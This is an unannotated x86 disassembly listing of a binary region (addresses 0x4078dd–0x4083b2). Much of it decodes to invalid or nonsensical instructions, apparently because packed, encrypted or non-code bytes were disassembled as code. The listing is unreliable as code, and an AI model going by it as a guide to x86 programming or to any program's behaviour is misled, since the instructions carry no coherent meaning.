  4078dd:	xor    eax,DWORD PTR [ebx]
  4078df:	xlat   BYTE PTR ds:[ebx]
  4078e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078e1:	inc    eax
  4078e2:	mov    esi,DWORD PTR [ecx+0x0]
	...
  40790c:	add    BYTE PTR [eax],al
  40790e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40790f:	(bad)  
  407910:	cld    
  407911:	shr    DWORD PTR [edi+0x16],1
  407914:	add    cl,ch
  407916:	aam    0xc6
  407918:	or     al,0xc1
  40791a:	outs   dx,DWORD PTR ds:[esi]
  40791b:	daa    
  40791c:	jmp    FWORD PTR [esi-0x4fa4e34f]
  407922:	or     BYTE PTR [edi+0x0],0x34
  407926:	shr    DWORD PTR [edi],0x81
  407929:	lods   eax,DWORD PTR ds:[esi]
  40792a:	xor    al,BYTE PTR [ecx-0x1]
  40792d:	mov    ?,WORD PTR [edi-0x3eff8e2a]
  407933:	in     al,0xfe
  407935:	push   eax
  407936:	dec    edi
  407937:	push   esi
  407938:	add    DWORD PTR [eax],eax
  40793a:	push   edi
  40793b:	hlt    
  40793c:	pop    ss
  40793d:	(bad)  
  40793e:	push   edi
  40793f:	pop    esp
  407940:	leave  
  407941:	ret    
  407942:	call   0x54:0x7283ebd1
  407949:	je     0x40799b
  40794b:	fnstcw WORD PTR [eax+edx*1+0x57]
  40794f:	push   eax
  407950:	sbb    edi,edi
  407952:	cli    
  407953:	das    
  407954:	(bad)  
  407955:	jne    0x407986
  407957:	hlt    
  407958:	(bad)  
  40795a:	jo     0x407940
  40795c:	(bad)  
  40795d:	jne    0x407966
  40795f:	in     eax,0x74
  407961:	or     al,0x60
  407963:	push   0x8
  407965:	call   0x3f8682
  40796a:	pop    esi
  40796b:	sbb    DWORD PTR [eax],edx
  40796d:	add    dl,cl
  40796f:	shr    bl,1
  407971:	add    DWORD PTR [eax],0x0
	...
  40799c:	ret    0x53
  40799f:	je     0x4079b4
  4079a1:	fnstcw WORD PTR [esp+ecx*1-0x29]
  4079a5:	dec    edi
  4079a6:	push   ss
  4079a7:	jmp    FWORD PTR [edx+0x4c]
  4079aa:	(bad)  
  4079ab:	jne    0x40797c
  4079ad:	repz mov dl,0xd6
  4079b0:	lock in al,0xfe
  4079b3:	jne    0x407998
  4079b5:	in     al,0x74
  4079b7:	or     bh,bh
  4079b9:	dec    ebp
  4079ba:	xlat   BYTE PTR ds:[ebx]
  4079bb:	inc    DWORD PTR [eax-0x58f33df2]
  4079c1:	mov    cl,BYTE PTR [ebx-0xfffeb14]
  4079c7:	jmp    FWORD PTR [edx+0x53]
  4079ca:	call   0xff24fa14
  4079cf:	mov    DWORD PTR [edx+0x53],ebx
  4079d2:	cmp    DWORD PTR [ebp+0x3e],0x36
  4079d6:	add    esi,DWORD PTR [eax+ebp*8-0x30]
  4079da:	(bad)  
  4079dc:	data16 cmp BYTE PTR [ecx-0x3cb38e01],0x74
  4079e4:	cld    
  4079e5:	mov    dh,0x40
  4079e7:	lock push cs
  4079e9:	mov    cl,0x10
  4079eb:	or     al,0x66
  4079ed:	sub    DWORD PTR [edx-0x3cb3ae01],edi
  4079f3:	je     0x407a01
  4079f5:	mov    bl,0x18
  4079f7:	cld    
  4079f8:	ds xor dh,bl
  4079fb:	jmp    FWORD PTR [esp+edx*2+0x759b]
	...
  407a2a:	xor    bh,BYTE PTR [esi+0x10]
  407a2d:	clc    
  407a2e:	push   ss
  407a2f:	mov    ah,BYTE PTR [ebp-0x3cc5de01]
  407a35:	jne    0x407a66
  407a37:	jne    0x407a49
  407a39:	adc    BYTE PTR [ecx],dl
  407a3b:	call   0x6cd479d6
  407a40:	call   0xf9ff:0x4a5c3675
  407a47:	push   ebp
  407a48:	mov    BYTE PTR [ebp-0x12],al
  407a4b:	in     al,0xaa
  407a4d:	(bad)  
  407a4e:	or     DWORD PTR [esi-0x67],eax
  407a51:	jmp    FWORD PTR [ebx+0x20]
  407a54:	stos   DWORD PTR es:[edi],eax
  407a55:	xchg   bh,dh
  407a57:	xor    eax,0x30fcc999
  407a5c:	add    edx,DWORD PTR [ebp-0x4b]
  407a5f:	sbb    BYTE PTR [ebp+0xf0dcec4],al
  407a65:	or     al,0xa6
  407a67:	loopne 0x407a22
  407a69:	push   DWORD PTR [ecx-0x42f3c035]
  407a6f:	xchg   DWORD PTR [eax],ecx
  407a71:	add    BYTE PTR [edx],ch
  407a73:	jne    0x407a0e
  407a75:	jne    0x407ac1
  407a77:	pop    ebx
  407a78:	xchg   ecx,eax
  407a79:	inc    esp
  407a7a:	jo     0x407aba
  407a7c:	sahf   
  407a7d:	or     eax,0x86dac77e
  407a82:	sti    
  407a83:	dec    edx
  407a84:	cmp    DWORD PTR [ecx-0x6e6eb10d],ebx
  407a8a:	nop
  407a8b:	ds jle 0x407a9b
	...
  407ab6:	add    BYTE PTR [eax],al
  407ab8:	jle    0x407a81
  407aba:	retf   0xe382
  407abd:	ds jmp 0xda9ba8c6
  407ac3:	repnz push eax
  407ac5:	enter  0x98f9,0xd3
  407ac9:	ds push esi
  407acb:	cmovbe edi,DWORD PTR [esi]
  407ace:	aam    0xb
  407ad0:	xor    BYTE PTR es:[edi-0x67],al
  407ad4:	xor    eax,edx
  407ad6:	mov    ds:0xcd338e93,eax
  407adb:	mov    eax,0xf2e3e21
  407ae0:	dec    edx
  407ae1:	xor    ecx,ebp
  407ae3:	mov    edx,0xc6303e11
  407ae8:	cmp    bl,BYTE PTR [ebx-0x44]
  407aeb:	mov    WORD PTR [edx],ss
  407aed:	fisub  DWORD PTR [esp+edx*4]
  407af0:	lea    esi,[edx+0x22]
  407af3:	cdq    
  407af4:	imul   edx,DWORD PTR [ebx+0x11],0x29
  407af8:	or     BYTE PTR [esi],bh
  407afa:	test   BYTE PTR [edx+0x176a537b],0x46
  407b01:	pop    ebx
  407b02:	pop    ebp
  407b03:	inc    edx
  407b04:	rol    edi,1
  407b06:	icebp  
  407b07:	stos   DWORD PTR es:[edi],eax
  407b08:	in     eax,0x1f
  407b0a:	(bad)  
  407b0b:	cwde   
  407b0c:	xor    eax,0xcad6551b
  407b11:	xchg   edi,eax
  407b12:	mov    ecx,0xf1c7b133
  407b17:	stos   DWORD PTR es:[edi],eax
  407b18:	int3   
  407b19:	sbb    al,0x0
  407b1b:	mov    dh,0x0
	...
  407b45:	add    dh,al
  407b47:	push   ecx
  407b48:	shl    BYTE PTR ds:0xa57cdaa0,0x3d
  407b4f:	pop    ebx
  407b50:	adc    cl,ch
  407b52:	xor    ch,BYTE PTR [ebx-0x1]
  407b55:	sbb    al,0xa6
  407b57:	cmp    eax,0x77a59175
  407b5c:	loop   0x407ae4
  407b5e:	(bad)  
  407b5f:	push   ecx
  407b60:	shl    ch,0x3c
  407b63:	call   0xe9e8:0xaaca2c8d
  407b6a:	xchg   esi,eax
  407b6b:	cmp    eax,0x534066ff
  407b70:	call   0xff7e009e
  407b75:	bound  edi,QWORD PTR [edx-0x5f]
  407b78:	leave  
  407b79:	sub    edi,DWORD PTR [ecx]
  407b7b:	cmp    eax,0xdad97254
  407b80:	ret    
  407b81:	jne    0x407b4a
  407b83:	cmp    al,0xff
  407b85:	mov    al,cs:0xb62efe03
  407b8b:	pop    ebx
  407b8c:	add    cl,ch
  407b8e:	cmp    eax,0x3aed44d0
  407b93:	sbb    esi,DWORD PTR [esp+ebp*8-0x43]
  407b97:	add    DWORD PTR [eax],0xffffff94
  407b9a:	clc    
  407b9b:	xor    edi,DWORD PTR [eax-0x18]
  407b9e:	cmp    eax,0x4174ff5b
  407ba3:	xor    ebx,ebp
  407ba5:	or     al,dh
  407ba7:	cmp    al,0xb
  407ba9:	sub    DWORD PTR [eax],eax
	...
  407bd3:	add    BYTE PTR [eax+0x4c],cl
  407bd6:	push   0x9a79ca
  407bdb:	fisubr WORD PTR [edi]
  407bdd:	dec    edi
  407bde:	call   0xff7d05d5
  407be3:	ret    0xb347
  407be6:	call   0xd6e3eb
  407beb:	push   DWORD PTR [edx+0x53]
  407bee:	call   0xff2546ff
  407bf3:	mov    DWORD PTR [edx],esp
  407bf5:	lahf   
  407bf6:	(bad)  
  407bf7:	(bad)  
  407bf8:	fsubr  DWORD PTR [edi+0x3e]
  407bfb:	add    DWORD PTR [edi-0x2a7a72a8],edx
  407c01:	in     eax,0xfe
  407c03:	push   DWORD PTR [edi]
  407c05:	out    dx,eax
  407c06:	sbb    eax,0xffffffb8
  407c09:	in     al,0x8c
  407c0b:	test   DWORD PTR [ebp+0x47fffee5],edx
  407c11:	in     al,0xb4
  407c13:	mov    eax,0xe8fee3e9
  407c18:	mov    cl,0x18
  407c1a:	add    BYTE PTR [eax],al
  407c1c:	into   
  407c1d:	fnstcw WORD PTR [ebx+0x3fe3e8fe]
  407c23:	bt     DWORD PTR [ecx+0x0],eax
  407c27:	add    BYTE PTR [edi],ah
  407c29:	rcl    DWORD PTR [edx+eax*8-0x8011b97],cl
  407c30:	adc    eax,0x27ffff48
  407c35:	push   ebp
  407c36:	test   BYTE PTR [ebx+0x0],al
	...
  407c60:	add    BYTE PTR [eax],al
  407c62:	daa    
  407c63:	pop    eax
  407c64:	add    BYTE PTR [ebp+0x684f33d5],cl
  407c6a:	dec    ecx
  407c6b:	xchg   esp,eax
  407c6c:	inc    ecx
  407c6d:	add    BYTE PTR [edi],bh
  407c6f:	aam    0xc2
  407c71:	add    bh,ah
  407c73:	push   eax
  407c74:	shl    BYTE PTR [ebp-0x1e],0xee
  407c78:	retf   
  407c79:	add    bh,dl
  407c7b:	push   edi
  407c7c:	lea    edx,[ebp-0x11adb]
  407c82:	dec    edx
  407c83:	call   0x414e:0xf76f502c
  407c8a:	xor    ch,BYTE PTR ds:[ebx+0x3317d72]
  407c91:	or     edi,DWORD PTR [esi+0x7e]
  407c94:	add    ecx,ebp
  407c96:	fnstenv [ecx]
  407c98:	add    eax,DWORD PTR [eax]
  407c9a:	mov    eax,ds:0x57e8087e
  407c9f:	adc    DWORD PTR [esi+0xff245ff],edx
  407ca5:	movhps xmm7,QWORD PTR [ebp-0x1ac1beb5]
  407cac:	(bad)  
  407cae:	fs mov bx,0x71ff
  407cb3:	call   0xbd7ee6c0
  407cb8:	adc    BYTE PTR [esi+edx*2],cl
  407cbb:	pop    eax
  407cbc:	mov    ebx,0x709e59ff
  407cc1:	ret    0xb450
  407cc4:	xchg   esi,eax
  407cc5:	lea    eax,[eax]
	...
  407cef:	add    ah,ch
  407cf1:	dec    ebp
  407cf2:	xor    dl,BYTE PTR [eax+0x56]
  407cf5:	aam    0xb9
  407cf7:	(bad)  
  407cf8:	cmp    ebp,esi
  407cfa:	xchg   ebp,eax
  407cfb:	jne    0x407d53
  407cfd:	mov    eax,ds:0xf0291410
  407d02:	repnz dec edi
  407d04:	and    eax,edi
  407d06:	or     ch,al
  407d08:	push   cs
  407d09:	mov    edx,DWORD PTR [esi-0x5156d901]
  407d0f:	dec    DWORD PTR [ecx]
  407d11:	dec    esi
  407d12:	and    ecx,DWORD PTR [ebp-0x7a73df84]
  407d18:	mov    dl,0x6a
  407d1a:	xchg   esi,eax
  407d1b:	(bad)  
  407d1c:	mov    ebp,0x72fff2df
  407d21:	inc    esi
  407d22:	stos   BYTE PTR es:[edi],al
  407d23:	adc    ah,cl
  407d25:	mov    bh,0xf3
  407d27:	(bad)  
  407d28:	xchg   ebx,eax
  407d29:	jo     0x407cc0
  407d2b:	call   ecx
  407d2d:	pop    ebx
  407d2e:	ror    DWORD PTR [ebp+0x8e95bfd],1
  407d34:	(bad)  
  407d35:	scas   eax,DWORD PTR es:[edi]
  407d36:	adc    al,0x2c
  407d38:	fldenv [ebx-0x4f4efbd8]
  407d3e:	cmc    
  407d3f:	stos   DWORD PTR es:[edi],eax
  407d40:	dec    edi
  407d41:	push   ss
  407d42:	mov    esi,0x7cf0a195
  407d47:	xchg   esi,eax
  407d48:	cdq    
  407d49:	cmp    bl,BYTE PTR [ecx]
  407d4b:	lods   al,BYTE PTR ds:[esi]
  407d4c:	not    DWORD PTR ds:0xddee95a6
  407d52:	sbb    edi,esp
	...
  407d7c:	add    BYTE PTR [eax],al
  407d7e:	sub    DWORD PTR [esi+0x4ef394e5],0x62eb9539
  407d88:	xchg   BYTE PTR [edi],ch
  407d8a:	inc    esi
  407d8b:	inc    esi
  407d8c:	in     eax,dx
  407d8d:	xchg   esp,eax
  407d8e:	jmp    0x407dde
  407d90:	sbb    DWORD PTR [ebp+0x308162d3],edx
  407d96:	push   ebx
  407d97:	cmp    ah,BYTE PTR [esi-0x54]
  407d9a:	cld    
  407d9b:	adc    DWORD PTR [esi-0x6b],ebx
  407d9e:	mov    bl,0xe0
  407da0:	sub    dl,BYTE PTR [esi-0x6b46c5c7]
  407da6:	jmp    0x407d9e
  407da8:	inc    esi
  407da9:	xchg   ebp,eax
  407daa:	sub    DWORD PTR [ebx-0x71],eax
  407dad:	ret    0x5b3e
  407db0:	ins    BYTE PTR es:[edi],dx
  407db1:	les    ecx,FWORD PTR [ecx-0x20]
  407db4:	aaa    
  407db5:	xchg   esi,eax
  407db6:	adc    DWORD PTR [edx],edi
  407db8:	es dec edi
  407dba:	retf   0x1e38
  407dbd:	xchg   ebp,eax
  407dbe:	push   ss
  407dbf:	cld    
  407dc0:	sub    al,BYTE PTR [esi+edi*1]
  407dc3:	cmp    dl,BYTE PTR [esp+ebx*2-0x10]
  407dc7:	cmp    DWORD PTR [esi],eax
  407dc9:	lods   al,BYTE PTR ds:[esi]
  407dca:	dec    esp
  407dcb:	adc    bh,dh
  407dcd:	xchg   esp,eax
  407dce:	neg    DWORD PTR [eax+eax*1]
  407dd1:	fnstsw WORD PTR ds:0x27fd8b90
  407dd7:	pop    ebx
  407dd8:	call   FWORD PTR [esi+ecx*8+0x38]
  407ddc:	jne    0x407dd7
  407dde:	stos   BYTE PTR es:[edi],al
  407ddf:	scas   eax,DWORD PTR es:[edi]
  407de0:	or     al,0xd6
	...
  407e0a:	add    BYTE PTR [eax],al
  407e0c:	dec    eax
  407e0d:	arpl   ax,bp
  407e0f:	push   cs
  407e10:	enter  0xff39,0xb0
  407e14:	jg     0x407e60
  407e16:	add    BYTE PTR [edi+esi*4],dl
  407e19:	inc    esi
  407e1a:	(bad)  
  407e1b:	cmp    al,0x46
  407e1d:	inc    ebx
  407e1e:	inc    ecx
  407e1f:	xchg   edx,eax
  407e20:	stos   BYTE PTR es:[edi],al
  407e21:	cmp    DWORD PTR [ebx],ecx
  407e23:	test   eax,0x14ff5939
  407e28:	mov    ch,BYTE PTR [ecx+0x39b7a6e8]
  407e2e:	(bad)  
  407e2f:	cmp    ebx,ecx
  407e31:	scas   eax,DWORD PTR es:[edi]
  407e32:	sbb    BYTE PTR [esi+0x7e504f38],al
  407e38:	xor    BYTE PTR [ebx-0x18],ah
  407e3b:	aaa    
  407e3c:	mov    dl,0x39
  407e3e:	inc    DWORD PTR [ecx+0x66ff1092]
  407e44:	je     0x407e62
  407e46:	adc    al,0xe9
  407e48:	adc    dh,ah
  407e4a:	jmp    0x407ea2
  407e4c:	dec    eax
  407e4d:	dec    edi
  407e4e:	call   esp
  407e50:	sub    eax,0x57f5753a
  407e55:	push   ebp
  407e56:	push   DWORD PTR [ebp+esi*1-0x4dc946bd]
  407e5d:	cmp    bh,bh
  407e5f:	mov    ah,0x21
  407e61:	cmp    dh,BYTE PTR [ebp-0x7]
  407e64:	mov    dl,0xae
  407e66:	or     al,0x93
  407e68:	push   ds
  407e69:	cmp    dh,BYTE PTR [ebp-0x1f]
  407e6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e6d:	add    edi,edi
  407e6f:	push   cs
	...
  407e98:	add    BYTE PTR [eax],al
  407e9a:	retf   0x7538
  407e9d:	add    BYTE PTR [ebx],cl
  407e9f:	shl    BYTE PTR [eax+edx*1-0x20],1
  407ea3:	data16 or al,0x6a
  407ea6:	repz iret 
  407ea8:	je     0x407eb2
  407eaa:	aas    
  407eab:	stos   DWORD PTR es:[edi],eax
  407eac:	(bad)  
  407ead:	jmp    eax
  407eaf:	test   cl,0x10
  407eb2:	xlat   BYTE PTR ds:[ebx]
  407eb3:	jae    0x407e40
  407eb5:	in     al,dx
  407eb6:	and    al,0x23
  407eb8:	lock push ebx
  407eba:	imul   esi,DWORD PTR [ebx+ebp*1-0x25],0xff0ca22c
  407ec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ec3:	fld    QWORD PTR [eax+edi*8-0x30]
  407ec7:	push   edx
  407ec8:	or     BYTE PTR [edi+0x45c6cb5a],cl
  407ece:	stos   DWORD PTR es:[edi],eax
  407ecf:	pop    edi
  407ed0:	add    BYTE PTR [eax],al
  407ed2:	xchg   edi,eax
  407ed3:	loope  0x407f11
  407ed5:	popf   
  407ed6:	sbb    al,0x9e
  407ed8:	add    BYTE PTR [eax],al
  407eda:	dec    ebx
  407edb:	imul   eax,DWORD PTR [ebx+0x745c6f7d],0x56
  407ee2:	shl    BYTE PTR [ecx+0x5e3d50f0],cl
  407ee8:	push   0x0
  407eea:	cmp    eax,0x477d835f
  407eef:	pop    esp
  407ef0:	je     0x407ef7
  407ef2:	loopne 0x407f45
  407ef4:	adc    bl,ch
  407ef6:	and    eax,0x276a0056
  407efb:	fild   DWORD PTR [eax+edi*8+0x0]
	...
  407f27:	add    bh,al
  407f29:	int3   
  407f2a:	adc    al,0x9d
  407f2c:	in     al,dx
  407f2d:	sahf   
  407f2e:	add    BYTE PTR [ebx],cl
  407f30:	addr16 push ebx
  407f32:	das    
  407f33:	and    edx,0xffffffcf
  407f36:	push   DWORD PTR [ebx-0x12]
  407f39:	mov    eax,0x9a8c0c45
  407f3e:	lock cmp edi,DWORD PTR [esi]
  407f41:	cmp    bl,BYTE PTR [edx]
  407f43:	pop    ss
  407f44:	jge    0x407fac
  407f46:	jg     0x407fbd
  407f48:	repnz lods al,BYTE PTR ds:[esi]
  407f4a:	adc    DWORD PTR [eax],ecx
  407f4c:	mov    ch,0x6
  407f4e:	xchg   ebx,eax
  407f4f:	jecxz  0x407f8d
  407f51:	xor    eax,0x167b8b67
  407f56:	xchg   edx,eax
  407f57:	jne    0x407f27
  407f59:	mov    al,0x3
  407f5b:	dec    DWORD PTR [ebx+0xe]
  407f5e:	fwait
  407f5f:	out    0x7e,al
  407f61:	inc    ecx
  407f62:	add    ecx,DWORD PTR [ebx+0x5b32887d]
  407f68:	ja     0x407f6d
  407f6a:	(bad)  
  407f6b:	dec    DWORD PTR [edx]
  407f6d:	lods   eax,DWORD PTR ds:[esi]
  407f6e:	lahf   
  407f6f:	add    DWORD PTR [edx-0x16a9ca13],0xffffff99
  407f76:	int3   
  407f77:	dec    edi
  407f78:	inc    DWORD PTR [ecx-0x65]
  407f7b:	ins    BYTE PTR es:[edi],dx
  407f7c:	jg     0x407fbf
  407f7e:	add    ecx,DWORD PTR [ebx-0x3b7f76a]
  407f84:	ds inc edx
  407f86:	add    eax,DWORD PTR [eax]
  407f88:	xor    eax,0x3e1702
	...
  407fb5:	add    dh,dl
  407fb7:	sbb    eax,0x553e4133
  407fbc:	pushf  
  407fbd:	hlt    
  407fbe:	jle    0x408001
  407fc0:	add    ecx,DWORD PTR [ebx]
  407fc2:	jle    0x407fd9
  407fc4:	loop   0x407f50
  407fc6:	dec    esi
  407fc7:	or     DWORD PTR [eax+0x50],ecx
  407fca:	jg     0x408010
  407fcc:	ss call 0x4404ef
  407fd2:	xor    eax,0xb51e1784
  407fd7:	pushf  
  407fd8:	add    BYTE PTR [ebp+0x1a],0xd5
  407fdc:	call   0x950:0x344feec
  407fe3:	pop    esp
  407fe4:	xchg   BYTE PTR ds:[ebx+0x4417e937],al
  407feb:	repz out 0x3,eax
  407fee:	ds pop ebx
  407ff0:	scas   al,BYTE PTR es:[edi]
  407ff1:	xor    DWORD PTR [ebp+0x3e4b2a24],eax
  407ff7:	pop    ebx
  407ff8:	jmp    0x92d5f900
  407ffd:	mov    esp,0x9f6290fd
  408002:	mov    ebp,0x385d91f
  408007:	xchg   esp,eax
  408008:	xor    al,BYTE PTR [ebx+0x3e]
  40800b:	pop    ebx
  40800c:	pop    ebp
  40800d:	idiv   BYTE PTR [eax+edi*2+0x5aff3d2c]
  408014:	jmp    0xfc1ab730
  408019:	and    al,BYTE PTR [eax]
	...
  408043:	add    BYTE PTR ds:0xb03e99c,al
  408049:	pop    esi
  40804a:	jno    0x40804f
  40804c:	ds pop ebx
  40804e:	jmp    0x2428fe0d
  408053:	mov    es,WORD PTR [eax-0x13616a5]
  408059:	pop    ebx
  40805a:	jmp    0xe9997f28
  40805f:	leave  
  408060:	(bad)  
  408061:	pop    ecx
  408062:	jmp    0xe99f7f30
  408067:	leave  
  408068:	(bad)  
  408069:	pop    edi
  40806a:	in     al,0x7e
  40806c:	add    ebp,DWORD PTR [edi]
  40806e:	mov    ecx,0xe9c13e1d
  408073:	sbb    eax,0x1de9c13e
  408078:	ds shr ecx,0x1b
  40807c:	pop    esi
  40807d:	pop    ecx
  40807e:	jmp    0xd3bc1486
  408083:	add    eax,0x33009fcb
  408088:	dec    edx
  408089:	ss adc eax,0x9c4a90
  40808f:	repnz std 
  408091:	scas   eax,DWORD PTR es:[edi]
  408092:	add    dh,BYTE PTR [eax]
  408094:	add    ebx,DWORD PTR [esi]
  408096:	inc    ebp
  408097:	sbb    DWORD PTR [edx],edi
  408099:	pop    ebx
  40809a:	add    cl,ch
  40809c:	push   0xce99f0a0
  4080a1:	scas   eax,DWORD PTR es:[edi]
  4080a2:	hlt    
  4080a3:	xchg   ebx,eax
  4080a4:	cmp    eax,0x941536
	...
  4080d1:	add    BYTE PTR [edx],dl
  4080d3:	pushf  
  4080d4:	add    dl,ah
  4080d6:	std    
  4080d7:	scas   eax,DWORD PTR es:[edi]
  4080d8:	pop    es
  4080d9:	scas   al,BYTE PTR es:[edi]
  4080da:	js     0x408107
  4080dc:	add    cl,ch
  4080de:	cmp    eax,0xd65cff5b
  4080e3:	xor    eax,0x9c6b4815
  4080e8:	add    BYTE PTR [edx-0x8],dh
  4080eb:	sub    cl,cl
  4080ed:	stos   BYTE PTR es:[edi],al
  4080ee:	push   eax
  4080ef:	loop   0x4080dc
  4080f1:	push   0x79
  4080f3:	loop   0x408081
  4080f5:	and    al,0xa
  4080f7:	mov    ebp,DWORD PTR [eax-0x6b]
  4080fa:	(bad)  
  4080fb:	fwait
  4080fc:	add    BYTE PTR [ecx-0x6900c6b8],dl
  408102:	sub    eax,0x3415c062
  408107:	fidivr DWORD PTR [ecx+esi*2+0x69]
  40810b:	lods   al,BYTE PTR ds:[esi]
  40810c:	imul   ebp,DWORD PTR [eax+eax*1+0x2b],0x50
  408111:	adc    DWORD PTR [eax-0x3f16ffe6],0x3ec7781a
  40811b:	in     eax,dx
  40811c:	inc    esp
  40811d:	pop    esi
  40811e:	ins    DWORD PTR es:[edi],dx
  40811f:	fs mov dh,0xac
  408122:	iret   
  408123:	mov    ecx,DWORD PTR [edi]
  408125:	xchg   edi,eax
  408126:	xor    BYTE PTR [esi],0x50
  408129:	add    BYTE PTR [eax],ch
  40812b:	xchg   ebx,eax
  40812c:	inc    ebp
  40812d:	cld    
  40812e:	mov    bh,0x5b
  408130:	mov    dh,0x45
  408132:	dec    esp
  408133:	push   0xb60f
	...
  408160:	loop   0x408148
  408162:	dec    edi
  408163:	punpcklwd mm3,DWORD PTR [ebp-0x6d17af07]
  40816a:	inc    ebp
  40816b:	clc    
  40816c:	mov    bh,0x5b
  40816e:	mov    bh,0x45
  408170:	push   ecx
  408171:	push   0xcc92b70f
  408176:	dec    edi
  408177:	call   DWORD PTR [edx-0x38]
  40817a:	addr16 icebp 
  40817c:	cwde   
  40817d:	cdq    
  40817e:	add    BYTE PTR [ebp-0x17af4b5e],cl
  408184:	mov    ecx,0x2400001f
  408189:	and    esi,DWORD PTR [ecx*4-0x17b0249e]
  408190:	dec    ecx
  408191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408192:	add    BYTE PTR [eax],al
  408194:	inc    edi
  408195:	fiadd  DWORD PTR [esp+ecx*4+0x37]
  408199:	push   edi
  40819a:	in     al,dx
  40819b:	dec    edi
  40819c:	pop    di
  40819e:	call   0xff24f990
  4081a3:	call   0x3f74db
  4081a8:	scas   al,BYTE PTR es:[edi]
  4081a9:	sbb    BYTE PTR [ebp-0x75],dl
  4081ac:	mov    ebx,0xb82cc3de
  4081b1:	in     al,0xfe
  4081b3:	push   ebx
  4081b4:	inc    eax
  4081b5:	push   ecx
  4081b6:	add    BYTE PTR [edx+0x67],ch
  4081b9:	in     eax,0x74
  4081bb:	or     BYTE PTR [edi-0x27002f28],bh
  4081c1:	mov    ch,0x45
  4081c3:	cld    
	...
  4081ec:	add    BYTE PTR [eax],al
  4081ee:	outs   dx,DWORD PTR ds:[esi]
  4081ef:	pop    edi
  4081f0:	add    bh,ch
  4081f2:	(bad)  
  4081f4:	je     0x4081fe
  4081f6:	ds call 0x9c1c:0xa529d0a0
  4081fe:	ds inc edx
  408200:	add    ecx,DWORD PTR [ebp-0x71de3d]
  408206:	adc    edx,edx
  408208:	call   0xbbc7:0x8f84f258
  40820f:	loope  0x40819e
  408211:	(bad)  
  408212:	stc    
  408213:	mov    ch,0x4
  408215:	add    BYTE PTR [esi],bh
  408217:	mov    edi,0x64e96089
  40821c:	(bad)  
  40821d:	push   eax
  40821e:	(bad)  
  40821f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408220:	dec    edi
  408221:	add    BYTE PTR [esi],bh
  408223:	or     DWORD PTR [ebx+ebp*1+0x7451beec],edi
  40822a:	leave  
  40822b:	inc    esp
  40822c:	mov    gs,ebx
  40822e:	sub    eax,0x32ffcec2
  408233:	aas    
  408234:	dec    ecx
  408235:	add    DWORD PTR [esi],edi
  408237:	inc    edx
  408238:	add    ecx,DWORD PTR [ebx]
  40823a:	mov    WORD PTR [ebp+0x4239c603],cs
  408240:	inc    esi
  408241:	inc    ecx
  408242:	mov    edi,0x3e00831a
  408247:	inc    edx
  408248:	adc    ebp,esp
  40824a:	xor    eax,0x16161702
  40824f:	fiadd  WORD PTR [edx]
	...
  408279:	add    BYTE PTR [eax],al
  40827b:	add    BYTE PTR [esi],bh
  40827d:	(bad)  
  40827e:	mov    BYTE PTR [eax+0x71],ah
  408281:	int3   
  408282:	lea    edx,[eax+0x69]
  408285:	dec    esi
  408286:	cld    
  408287:	out    0xa2,eax
  408289:	ror    DWORD PTR [ebp+0x194565ff],1
  40828f:	add    ah,ah
  408291:	inc    ecx
  408292:	mov    ?,WORD PTR [ebp+0x36]
  408295:	ficomp DWORD PTR [eax+edx*8+0x41]
  408299:	pop    edx
  40829a:	data16 fwait
  40829c:	or     esi,DWORD PTR [ecx]
  40829e:	pop    esi
  40829f:	mov    cs,WORD PTR [esi+0x21fbdc32]
  4082a5:	(bad)  
  4082a6:	cmp    DWORD PTR [esi+0x7e9c421],ecx
  4082ac:	ds pop ebx
  4082ae:	push   ecx
  4082af:	(bad)
  4082b2:	ss jl  0x408278
  4082b5:	(bad)  
  4082b6:	mov    es,WORD PTR cs:[ecx]
  4082b9:	les    esp,FWORD PTR [esi]
  4082bb:	add    bh,BYTE PTR [esi]
  4082bd:	pop    ebx
  4082be:	push   ds
  4082bf:	pop    eax
  4082c0:	xchg   edx,eax
  4082c1:	xor    dl,BYTE PTR [esi]
  4082c3:	mov    ss,WORD PTR [esi+0x5d]
  4082c6:	stc    
  4082c7:	add    edi,DWORD PTR [esi]
  4082c9:	ret    
  4082ca:	jmp    0x119bc0d6
  4082cf:	call   0x3429de64
  4082d4:	leave  
  4082d5:	call   0x33021166
  4082da:	out    0x17,al
  4082dc:	inc    esi
  4082dd:	inc    ebx
  4082de:	inc    esi
  4082df:	mov    ah,0x0
	...
  408309:	add    BYTE PTR [ecx+0x3d8d4132],dh
  40830f:	pop    ebx
  408310:	jmp    0xc6d06ea1
  408315:	lea    ebx,[ecx-0x6e0c173d]
  40831b:	xor    al,BYTE PTR [ecx+0x4]
  40831e:	inc    edx
  40831f:	pop    ebx
  408320:	jmp    0xe93205c0
  408325:	add    ecx,DWORD PTR [esi]
  408327:	xor    dl,BYTE PTR [eax+esi*1+0x71]
  40832b:	xor    dl,BYTE PTR [esi-0x7e9d0c73]
  408331:	into   
  408332:	jno    0x408366
  408334:	xchg   BYTE PTR [ebx+eax*4-0x117281d0],bl
  40833b:	xor    DWORD PTR [eax],eax
  40833d:	cld    
  40833e:	inc    ebp
  40833f:	cmp    bh,dl
  408341:	sahf   
  408342:	mov    bl,0x32
  408344:	call   0xff724f01
  408349:	ins    BYTE PTR es:[edi],dx
  40834a:	mov    ecx,0xbb56ff92
  40834f:	mov    ch,BYTE PTR [eax+0x3d]
  408352:	arpl   WORD PTR [eax+eax*1-0xc532af],bx
  408359:	ds xchg ebp,eax
  40835b:	fcom   DWORD PTR [ebx+0x36]
  40835e:	mov    ebx,0x466c8331
  408363:	xor    bh,bh
  408365:	es inc edx
  408367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408368:	inc    ebp
  408369:	push   0xffffff81
  40836b:	xchg   ebx,eax
  40836c:	call   DWORD PTR [esi]
	...
  408396:	add    BYTE PTR [eax],al
  408398:	mov    ebx,0xbecd7246
  40839d:	xlat   BYTE PTR ds:[ebx]
  40839e:	push   edi
  40839f:	push   es
  4083a0:	retf   
  4083a1:	xor    DWORD PTR [esi+edi*8],eax
  4083a4:	push   0xbaf6ff93
  4083a9:	xor    DWORD PTR [ebp-0x1f],esi
  4083ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083ad:	jmp    0xde0b6a80
  4083b2:	lods   al,BYTE PTR ds:[esi]
